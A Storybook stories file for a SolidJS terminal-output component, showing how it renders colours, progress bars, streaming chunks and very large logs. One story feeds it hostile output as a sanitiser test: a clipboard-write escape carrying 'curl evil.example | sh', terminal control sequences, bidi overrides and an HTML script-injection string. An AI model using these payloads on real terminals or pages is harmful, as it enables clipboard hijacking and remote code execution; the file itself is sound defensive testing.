import { createSignal, onCleanup } from 'solid-js'
import type { JSX } from 'solid-js'
import type { Meta, StoryObj } from 'storybook-solidjs-vite'
import { Button } from '../../ui/button'
import { Trace, TraceLine } from '../../ui/trace'
import { Terminal } from './terminal'
import type { TerminalStatus } from './terminal-model'

const ESC = '\u001b'
const sgr = (codes: string, text: string) => `${ESC}[${codes}m${text}${ESC}[0m`

const meta = {
  title: 'Composites/Terminal',
  component: Terminal,
  tags: ['autodocs'],
  parameters: {
    docs: {
      description: {
        component:
          'A command and its output as it streams. Output is untrusted bytes: a fixed subset of ANSI (sixteen theme colours and a few attributes) is honoured, carriage returns overwrite so progress bars redraw in place, and everything else — cursor movement, title and clipboard sequences, anything malformed — is dropped rather than echoed. Status appears only when the host supplies it; only the last `maxLines` lines are mounted; the view follows new output only while the reader is at the bottom.',
      },
    },
  },
  args: { output: '' },
  decorators: [
    (Story: () => JSX.Element) => (
      <div class="w-[40rem] max-w-full">
        <Story />
      </div>
    ),
  ],
} satisfies Meta<typeof Terminal>

export default meta
type Story = StoryObj<typeof meta>

const testRun = [
  `${sgr('1', 'bun test')} v1.4.2`,
  '',
  `${sgr('90', 'src/lib/keyed-rows.test.ts:')}`,
  `${sgr('32', '✓')} keeps rows across a refetch ${sgr('90', '[0.31ms]')}`,
  `${sgr('32', '✓')} drops a row when its key disappears ${sgr('90', '[0.12ms]')}`,
  `${sgr('31', '✗')} reuses the row when the key repeats ${sgr('90', '[1.04ms]')}`,
  `${sgr('31;1', 'error')}: expect(received).toBe(expected)`,
  '',
  `${sgr('2', 'Expected: 2')}`,
  `${sgr('2', 'Received: 3')}`,
  '',
  ` ${sgr('32', '2 pass')}`,
  ` ${sgr('31', '1 fail')}`,
  'Ran 3 tests across 1 file. [18.00ms]',
  '',
].join('\n')

/**
 * A finished run with a non-zero exit. The header says it in words and tones it;
 * the output keeps the theme's sixteen colours on the theme's terminal surface.
 */
export const Failed: Story = {
  args: {
    command: 'bun test --conditions=browser src/lib',
    output: testRun,
    status: { state: 'exited', code: 1 },
  },
}

/** Exit code 0 is a fact stated in words; there is no tick, because that would be a verdict. */
export const Exited: Story = {
  args: {
    command: 'bun run lint',
    output: `${sgr('32', 'Found 0 warnings and 0 errors.')}\nFinished in 112ms on 214 files using 4 threads.\n`,
    status: { state: 'exited', code: 0 },
  },
}

export const Cancelled: Story = {
  args: {
    command: 'bun run build',
    output: 'vite v7.1.0 building for production...\ntransforming (212) src/index.ts\n',
    status: { state: 'cancelled' },
  },
}

/**
 * No `status` at all: the host did not say whether the command is running, so
 * the header makes no claim either way.
 */
export const StatusAbsent: Story = {
  args: {
    command: 'git log --oneline -3',
    output:
      'e5de178 chore(main): release 0.131.0\nce05fe0 feat(appearance-editor): row accent style\nad6fc44 chore(main): release 0.130.4\n',
  },
}

/** Empty output reads differently while the command runs and when the host says nothing. */
export const EmptyOutput: Story = {
  render: () => (
    <div class="flex flex-col gap-3">
      <Terminal command="make deploy" output="" status={{ state: 'running' }} />
      <Terminal command="true" output="" status={{ state: 'exited', code: 0 }} />
      <Terminal output="" />
    </div>
  ),
}

/**
 * A command that is still producing output. Chunks are cut at arbitrary points —
 * including inside an escape sequence — and the progress bar redraws one line in
 * place with `\r`. Scroll up and the view stays where you put it, with a "New
 * output" control; scroll back to the bottom and it follows again.
 */
export const Streaming: Story = {
  render: () => {
    const script = [
      `${sgr('1', '$ bun install')}\n`,
      'Resolving dependencies\n',
      ...Array.from(
        { length: 21 },
        (_, i) => `\rDownloading ${'#'.repeat(i)}${'.'.repeat(20 - i)} ${i * 5}%`
      ),
      `\r${ESC}[KDownloaded 100 packages\n`,
      ...Array.from({ length: 30 }, (_, i) => `${sgr('32', '+')} package-${i + 1}@1.${i}.0\n`),
      // The next chunk ends inside an escape sequence; nothing renders until it completes.
      `${ESC}[3`,
      '2mInstalled',
      `${ESC}[0m in 4.1s\n`,
    ]
    const [output, setOutput] = createSignal('')
    const [status, setStatus] = createSignal<TerminalStatus>({ state: 'running' })
    let step = 0
    const timer = setInterval(() => {
      if (step >= script.length) {
        setStatus({ state: 'exited', code: 0 })
        clearInterval(timer)
        return
      }
      setOutput((current) => current + script[step])
      step += 1
    }, 120)
    onCleanup(() => clearInterval(timer))
    return <Terminal command="bun install" output={output()} status={status()} maxHeight="11rem" />
  },
}

/** A chunk boundary inside an escape: the half-read sequence is held back, never shown as text. */
export const PartialEscape: Story = {
  args: {
    command: 'ls --color',
    output: `${sgr('34', 'src')}  ${sgr('34', 'docs')}  package.json  ${ESC}[3`,
    status: { state: 'running' },
  },
}

/** Progress bars overwrite their own line; only the last state remains. */
export const ProgressBar: Story = {
  args: {
    command: 'curl -O https://example.com/archive.tar.gz',
    output: [
      ...Array.from(
        { length: 11 },
        (_, i) => `\r${'='.repeat(i * 2)}${'.'.repeat(20 - i * 2)} ${i * 10}%`
      ),
      '\nsaved archive.tar.gz\n',
    ].join(''),
    status: { state: 'exited', code: 0 },
  },
}

const palette = [
  ...Array.from({ length: 8 }, (_, i) => `${ESC}[${30 + i}m ${i} ${ESC}[0m`),
  '\n',
  ...Array.from({ length: 8 }, (_, i) => `${ESC}[${90 + i}m ${i + 8} ${ESC}[0m`),
  '\n',
  ...Array.from({ length: 8 }, (_, i) => `${ESC}[${40 + i}m ${i} ${ESC}[0m`),
  '\n',
  `${sgr('1', 'bold')} ${sgr('2', 'dim')} ${sgr('3', 'italic')} ${sgr('4', 'underline')} ${sgr('9', 'strike')} ${sgr('7', 'reverse')} ${sgr('4;9', 'both')}\n`,
  `${ESC}[38;5;196m256 red${ESC}[0m ${ESC}[38;5;46m256 green${ESC}[0m ${ESC}[38;2;255;165;0mtruecolour orange${ESC}[0m (mapped to the nearest theme colour)\n`,
].join('')

/** Everything the parser keeps: 16 colours, attributes, reverse video, and mapped extended colours. */
export const Palette: Story = {
  args: { command: 'colors', output: palette },
}

/**
 * Hostile output. The title change, clipboard write (OSC 52), cursor movement,
 * 8-bit CSI, bidirectional override and `conceal` are all dropped; what is left
 * is the text the command printed. Copy still returns the bytes exactly as received.
 */
export const HostileOutput: Story = {
  args: {
    command: 'cat untrusted.log',
    output: [
      `${ESC}]0;pwned${'\u0007'}`,
      `${ESC}]52;c;${btoa('curl evil.example | sh')}${'\u0007'}`,
      `visible ${ESC}[2J${ESC}[1;1H${ESC}[?1049h`,
      `\u009b31mnot red\u009b0m `,
      `${ESC}[8mconcealed? no${ESC}[0m `,
      'a‮b‮c\n',
      `<img src=x onerror=alert(1)> <script>alert(2)</script>\n`,
      `${ESC}[31`,
    ].join(''),
    status: { state: 'exited', code: 0 },
  },
}

/** A line of a million characters is capped, and the omission is stated. */
export const HugeLine: Story = {
  args: {
    command: 'cat minified.js',
    output: `${'x'.repeat(2_000_000)}\nnext line\n`,
    status: { state: 'exited', code: 0 },
  },
}

/** `wrap` for prose-like logs in a narrow column; columns stay aligned without it. */
export const Wrapped: Story = {
  args: {
    command: 'tail -n 2 app.log',
    wrap: true,
    output:
      '2026-10-15T09:41:12Z level=error msg="upstream timed out after 30s while resolving the settings navigation bundle" attempt=3 request_id=7f3c1d90-aa12-4c9e\n2026-10-15T09:41:13Z level=info msg="retrying"\n',
    status: { state: 'exited', code: 0 },
  },
}

const bigOutput = Array.from(
  { length: 100_000 },
  (_, i) => `[${String(i + 1).padStart(6, '0')}] ${sgr('32', 'ok')} processed record ${i}`
).join('\n')

/**
 * 100 000 lines. Only the last 1 000 are mounted; the rest are counted in the
 * note and can be revealed a page at a time. Copy writes all 100 000.
 */
export const HundredThousandLines: Story = {
  args: {
    command: 'node import.js',
    output: bigOutput,
    status: { state: 'exited', code: 0 },
    maxHeight: '16rem',
  },
}

/** `onClear` is the host's: the button appears only when it supplies one. */
export const WithClear: Story = {
  render: () => {
    const [output, setOutput] = createSignal(testRun)
    return (
      <div class="flex flex-col gap-2">
        <Terminal
          command="bun test"
          output={output()}
          status={{ state: 'exited', code: 1 }}
          onClear={() => setOutput('')}
        />
        <div>
          <Button size="xs" variant="outline" onClick={() => setOutput(testRun)}>
            Restore output
          </Button>
        </div>
      </div>
    )
  },
}

/** The compact chrome, as the body of a Trace line. */
export const InsideTrace: Story = {
  render: () => (
    <Trace aria-label="Activity">
      <TraceLine title="Ran bun test" description="1 failed" status="error" defaultOpen>
        <Terminal
          size="sm"
          command="bun test"
          output={testRun}
          status={{ state: 'exited', code: 1 }}
          maxHeight="9rem"
        />
      </TraceLine>
    </Trace>
  ),
}
